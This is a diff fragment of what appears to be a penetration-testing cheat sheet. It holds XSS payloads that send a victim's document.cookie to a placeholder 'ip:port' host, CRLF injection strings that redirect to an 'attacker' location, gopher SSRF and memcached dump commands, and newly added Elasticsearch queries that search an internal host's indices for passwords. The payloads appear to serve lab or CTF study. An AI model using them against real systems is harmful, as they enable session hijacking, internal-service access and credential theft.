@@ -248,7 +248,7 @@ https://malwaredecoder.com/
 
 -> Examples
   
-`<script type=“text/javascript”>document.location=“http://ip:port/?cookie=“+document.cookie;</script>`
+`<script type=“text/javascript”>document.location=“http://ip:port/?cookie=“+document.cookie;</script>`  
 `<script>window.location="http://ip:port/?cookie="+document.cookie;</script>`
 
 ## Type Juggling
@@ -916,9 +916,7 @@ gopher://127.0.0.1:port/_
 
 ### Scripts
 
--> memcached.py   
-
-  
+-> memcached.py  
 `stats items`    
 `stats cachedump <slab class> <number of items to dump>`  
 `get <item>`
@@ -1011,9 +1009,15 @@ xhr.send(null);
 
 ## CRLF Injection
   
-`/%0d%0aLocation:attacker`
-
+`/%0d%0aLocation:attacker`  
 `/%0d%0a%0d%0a\<svg onload=(0)>`
+
+## Elasticsearch - API
+
+-> Extract info  
+http://10.10.57.49:9200/_cat/indices?v  
+http://10.10.57.49:9200/<indice>  
+http://10.10.57.49:9200/_search?pretty=true&q=pass  
 
 ## XXE
 
